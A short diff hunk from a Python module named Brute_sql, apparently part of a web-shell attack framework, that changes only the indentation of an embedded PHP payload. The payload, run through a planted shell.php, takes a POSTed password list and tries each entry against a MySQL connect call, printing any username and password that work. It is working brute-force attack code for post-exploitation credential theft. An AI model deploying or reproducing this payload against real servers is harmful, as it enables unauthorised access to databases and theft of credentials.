@@ -20,8 +20,8 @@ class Brute_sql(Module):
             Vector('shell.php', 'brute_mysql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
 foreach(split('[\n]+',$w) as $pwd) {
 if(@$m($h, $u, $pwd)){
-    print("+" . $u . ":" . $pwd . "\n");
-    break;
+print("+" . $u . ":" . $pwd . "\n");
+break;
 }
 } 
 """)
